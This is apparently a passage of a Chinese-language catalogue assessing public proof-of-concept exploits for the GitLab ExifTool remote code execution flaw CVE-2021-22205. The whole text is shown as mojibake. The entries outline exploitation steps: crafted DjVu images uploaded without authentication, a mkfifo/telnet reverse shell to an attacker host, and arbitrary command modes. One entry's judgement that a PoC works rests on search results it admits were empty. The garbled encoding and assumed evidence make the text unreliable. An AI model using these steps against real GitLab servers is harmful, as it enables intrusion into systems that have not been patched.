è¯¥æ¼æ´žå­˜åœ¨äºŽGitLabä¸­ï¼Œç”±äºŽExifToolåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶æœªæ­£ç¡®éªŒè¯ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶è§¦å‘æ¼æ´žã€‚å…·ä½“æ¥è¯´ï¼ŒGitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè€ŒExifToolåœ¨å¤„ç†DjVuæ ¼å¼æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´žã€‚æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ä»£ç çš„DjVuæ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³GitLabï¼Œå½“GitLabå°è¯•è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œç»éªŒè¯æœ‰æ•ˆã€‚å®ƒé€šè¿‡åˆ›å»ºåŒ…å«æ¶æ„å…ƒæ•°æ®çš„DjVuå›¾åƒæ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚å½“GitLabå¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡ŒåµŒå…¥åœ¨å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°ä»»ä½•éšè—çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç çš„åŠŸèƒ½æ˜Žç¡®ï¼Œå³åˆ©ç”¨CVE-2021-22205æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚æ‰€æœ‰æ“ä½œéƒ½åœ¨è„šæœ¬ä¸­æ¸…æ™°å¯è§ï¼Œæ²¡æœ‰æ··æ·†æˆ–éšè—è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦èŽ·å–ç›®æ ‡GitLabå®žä¾‹çš„URLã€‚
2.  ç„¶åŽï¼Œæ”»å‡»è€…ä½¿ç”¨POCè„šæœ¬ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„DjVuå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
3.  è„šæœ¬ä½¿ç”¨`djvumake`å‘½ä»¤åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„`rce.djvu`æ–‡ä»¶ï¼Œå†å°†å…¶é‡å‘½åä¸º`rce.jpg`ã€‚
4.  POCä»£ç é€šè¿‡æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚
5.  GitLabæŽ¥æ”¶åˆ°æ–‡ä»¶åŽï¼Œä¼šè°ƒç”¨ExifToolè¿›è¡Œå¤„ç†ï¼Œç”±äºŽExifToolå­˜åœ¨æ¼æ´žï¼Œå¯¼è‡´æ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„ä»£ç ã€‚
6.  æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [mr-r3bot/Gitlab-CVE-2021-22205](https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #19

**æ¥æº**: [CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md](../2021/CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLabä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ExifToolå‘½ä»¤æ³¨å…¥ä»£ç ï¼Œå½“GitLabå°è¯•å¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„POCä»£ç ï¼Œæ­¤æ¼æ´žåˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ï¼Œå¹¶ä¸”CISA KEVç›®å½•ä¹Ÿæ”¶å½•äº†è¯¥æ¼æ´žï¼Œè¯´æ˜Žå­˜åœ¨è¢«åˆ©ç”¨çš„æƒ…å†µã€‚POCä»£ç å®žçŽ°äº†æœªæŽˆæƒæƒ…å†µä¸‹çš„RCEï¼Œåˆ©ç”¨äº†ä¸Šä¼ åŠŸèƒ½å’ŒExifToolçš„å‘½ä»¤æ³¨å…¥ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯å®žçŽ°æ¼æ´žåˆ©ç”¨ï¼Œå¹¶æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚é£Žé™©è¯„ä¼°ä¸º5%ï¼Œè¾ƒä½Žã€‚

*   ä»£ç ç»“æž„æ¸…æ™°ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæž„é€ æ¶æ„å›¾åƒä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚
*   ä»£ç ä¸­å­˜åœ¨ä¸ŽDNSlogäº¤äº’çš„éƒ¨åˆ†ï¼Œå¯ä»¥éªŒè¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚
*   æ€»ä½“è€Œè¨€ï¼Œä»£ç åŠŸèƒ½é›†ä¸­äºŽæ¼æ´žåˆ©ç”¨æœ¬èº«ï¼Œæ²¡æœ‰å‘çŽ°é¢å¤–æ¶æ„è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆæ‰¾åˆ°ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ (`/users/sign_in`)ã€‚
2.  ä»Žç™»å½•é¡µé¢çš„HTMLæºä»£ç ä¸­æå–CSRF tokenï¼Œç”¨äºŽåŽç»­çš„POSTè¯·æ±‚ã€‚
3.  æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ExifToolå‘½ä»¤çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆå®žé™…ä¸Šæ˜¯DJVUæ–‡ä»¶ï¼‰ã€‚è¯¥æ¶æ„å‘½ä»¤è¢«åµŒå…¥åˆ°å›¾åƒçš„metadataä¸­ã€‚
4.  é€šè¿‡å‘ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶çš„multipart/form-data POSTè¯·æ±‚ï¼Œä¸Šä¼ è¯¥å›¾åƒã€‚
5.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifToolæ‰§è¡Œå›¾åƒmetadataä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

åˆ©ç”¨ä»£ç ä¸­åŒ…å«ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

*   æ£€æŸ¥æ¨¡å¼ (`-v true`)ï¼šé€šè¿‡ä¸Šä¼ åŒ…å«ç‰¹å®šDNSlogåŸŸåçš„æ¶æ„å›¾ç‰‡ï¼Œæ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚
*   æ”»å‡»æ¨¡å¼ (`-a true`)ï¼šå…è®¸æ”»å‡»è€…æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ (`-c command`)ï¼Œç›´æŽ¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æ–‡ä»¶æ¨¡å¼ (`-s true`): ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ `-f file`ã€‚

æ€»ç»“ï¼šæ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„å›¾åƒï¼Œåˆ©ç”¨ExifToolå‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå®žçŽ°åœ¨ç›®æ ‡GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [osungjinwoo/CVE-2021-22205-gitlab](https://github.com/osungjinwoo/CVE-2021-22205-gitlab)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #20

**æ¥æº**: [CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md](../2021/CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„å¤šä¸ªç‰ˆæœ¬ã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶è€Œå¯¼è‡´çš„ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨åˆ†æžï¼š**

æä¾›çš„`DejaVu.sh`è„šæœ¬ç”¨äºŽåˆ©ç”¨ CVE-2021-22205ã€‚ä»¥ä¸‹æ˜¯è„šæœ¬çš„å·¥ä½œåŽŸç†ï¼š

1.  **å‚æ•°å¤„ç†ï¼š** è„šæœ¬æŽ¥å— LHOSTï¼ˆæ”»å‡»è€…ç›‘å¬åœ°å€ï¼‰ã€LPORTï¼ˆæ”»å‡»è€…ç›‘å¬ç«¯å£ï¼‰å’Œ WEBHOSTï¼ˆç›®æ ‡ GitLab å®žä¾‹çš„ URLï¼‰ä½œä¸ºå‚æ•°ã€‚
2.  **ç”Ÿæˆæ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `lol.jpg` çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶çš„å‰é¢éƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„JPEGæ–‡ä»¶ï¼ŒåŽé¢é™„åŠ äº†ç²¾å¿ƒæž„é€ çš„ExifToolå‘½ä»¤æ³¨å…¥æœ‰æ•ˆè½½è·ã€‚
3.  **ExifTool å‘½ä»¤æ³¨å…¥ï¼š** æ¼æ´žçš„æ ¹æºåœ¨äºŽ GitLab ä½¿ç”¨ ExifTool å¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶å­˜åœ¨ç¼ºé™·ã€‚é€šè¿‡åœ¨å›¾åƒå…ƒæ•°æ®ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
4.  **åå¼¹ Shellï¼š** è¯¥è„šæœ¬ä½¿ç”¨ `mkfifo` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åŽä½¿ç”¨ `telnet` è¿žæŽ¥åˆ°æ”»å‡»è€…çš„ LHOST å’Œ LPORTï¼Œå¹¶å°† shell çš„è¾“å…¥å’Œè¾“å‡ºé‡å®šå‘åˆ°è¯¥ç®¡é“ã€‚è¿™æœ‰æ•ˆåœ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªåå¼¹ shellã€‚
5.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** è„šæœ¬ä½¿ç”¨ `curl` å‘½ä»¤å°† `lol.jpg` æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°æŒ‡ç¤º `curl` å°†è¯¥æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å‘é€ã€‚æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ï¼Œä»Žè€Œè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† CVE-2021-22205 ä¸­æè¿°çš„æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚é€šè¿‡è®¾ç½®æ­£ç¡®çš„ LHOSTã€LPORT å’Œ WEBHOSTï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ä¸ŠèŽ·å¾— shell è®¿é—®æƒé™ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

åˆ†æžæä¾›çš„è„šæœ¬ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬é€»è¾‘æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨ CVE-2021-22205 æ¼æ´žã€‚æ²¡æœ‰å‘çŽ°ä»»ä½•è¯•å›¾åœ¨å—å®³è€…ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ã€åˆ é™¤æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„éšè—ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š**

1.  æ”»å‡»è€…å‡†å¤‡åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é…ç½® `DejaVu.sh` è„šæœ¬ï¼Œæä¾›æ”»å‡»è€…çš„ç›‘å¬åœ°å€å’Œç«¯å£ä»¥åŠç›®æ ‡ GitLab å®žä¾‹çš„ URLã€‚
3.  æ”»å‡»è€…æ‰§è¡Œè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚
4.  GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè°ƒç”¨ ExifTool æå–å…ƒæ•°æ®ã€‚
5.  ExifTool æ‰§è¡Œæ¶æ„å…ƒæ•°æ®ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹åå¼¹ shellã€‚
6.  æ”»å‡»è€…çŽ°åœ¨å¯ä»¥é€šè¿‡åå¼¹ shell ä¸Ž GitLab æœåŠ¡å™¨äº¤äº’ã€‚

**é¡¹ç›®åœ°å€:** [overgrowncarrot1/DejaVu-CVE-2021-22205](https://github.com/overgrowncarrot1/DejaVu-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #21

**æ¥æº**: [CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md](../2021/CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæŽˆæƒç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯è§¦å‘

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽGitLab CE/EEä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶éªŒè¯ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ã€æœç´¢å¼•æ“Žç»“æžœï¼ˆè™½ç„¶å®žé™…çš„æœç´¢å¼•æ“Žç»“æžœä¸ºç©ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾æœåˆ°çš„æ˜¯ç›¸å…³çš„æ¼æ´žåˆ†æžå’Œå¤çŽ°æ–‡ç« ï¼‰å’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤å®šè¯¥POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯æ˜Žç¡®æŒ‡å‡ºè¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»¥åŠæ¼æ´žæˆå› ï¼ŒPOCä»£ç ä¹Ÿé€šè¿‡æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„DJVUå›¾åƒæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

åˆ†æžæä¾›çš„POCä»£ç ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­åµŒå…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¯¥è„šæœ¬ä»Žå‘½ä»¤è¡ŒæŽ¥æ”¶ç›®æ ‡GitLab URLå’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åŽæž„é€ HTTPè¯·æ±‚ï¼Œä¸Šä¼ åŒ…å«æ¶æ„payloadçš„å›¾åƒæ–‡ä»¶ã€‚è™½ç„¶ä»£ç ä¸­åŒ…å«ä»£ç†è®¾ç½®ï¼ˆ`proxyUrl, err := url.Parse("http://localhost:9090")`ï¼‰ï¼Œé»˜è®¤ä½¿ç”¨`http://localhost:9090`ä½œä¸ºä»£ç†ã€‚å¦‚æžœæ”»å‡»è€…æƒ³è¦è¿›è¡Œä¸­é—´äººæ”»å‡»æˆ–æµé‡åŠ«æŒï¼Œæ¶æ„ä¿®æ”¹ä»£ç†æœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æŠ•æ¯’é£Žé™©ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºæ¶æ„ä»£ç†æœåŠ¡å™¨ï¼Œä½†è¿™ç§é£Žé™©è¾ƒä½Žï¼Œå› ä¸ºè¿™æ›´å¤šçš„æ˜¯ä¸€ç§é…ç½®é—®é¢˜ï¼Œè€Œéžä»£ç æœ¬èº«åŒ…å«æ¶æ„é€»è¾‘ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£Žé™©å¾ˆä½Žï¼Œå¤§çº¦1%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æžï¼š**

1.  æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„payloadçš„DJVUå›¾åƒæ–‡ä»¶ã€‚Payloadä¸­åŒ…å«è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ©ç”¨äº†ExifToolå¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚
2.  æ”»å‡»è€…é€šè¿‡HTTP POSTè¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹çš„`/uploads/user`ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹ç”¨äºŽå¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚
3.  GitLabä½¿ç”¨ExifToolè§£æžä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ã€‚ç”±äºŽæ–‡ä»¶åŒ…å«æ¶æ„payloadï¼ŒExifToolä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹shellã€è¯»å–æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [pizza-power/Golang-CVE-2021-22205-POC](https://github.com/pizza-power/Golang-CVE-2021-22205-POC)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #22

**æ¥æº**: [CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md](../2021/CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯æŒ‡å‡ºè¯¥æ¼æ´žçš„å½±å“æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒCVSSè¯„åˆ†ä¸º10åˆ†ï¼ˆCRITICALï¼‰ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§å¾ˆé«˜ã€‚æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆ`exploit.py`ï¼‰é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žï¼ˆå®žé™…ä¸Šæ˜¯ CVE-2021-22204ï¼ŒExifTool æœ¬èº«çš„æ¼æ´žï¼‰ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`scan` å‡½æ•°ç”¨äºŽæ£€æµ‹ç›®æ ‡æ˜¯å¦æ˜“å—æ”»å‡»ï¼Œ`attack` å‡½æ•°ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

åˆ†æžæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¹¶æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`exploit.py` ä¸»è¦åŠŸèƒ½æ˜¯ï¼š

1.  èŽ·å– GitLab çš„ CSRF tokenã€‚
2.  æž„é€ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚
3.  å‘ GitLab çš„ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒçš„ POST è¯·æ±‚ã€‚
4.  å¦‚æžœå“åº”åŒ…å« â€œFailed to process imageâ€ï¼Œåˆ™è®¤ä¸ºç›®æ ‡å­˜åœ¨æ¼æ´žã€‚

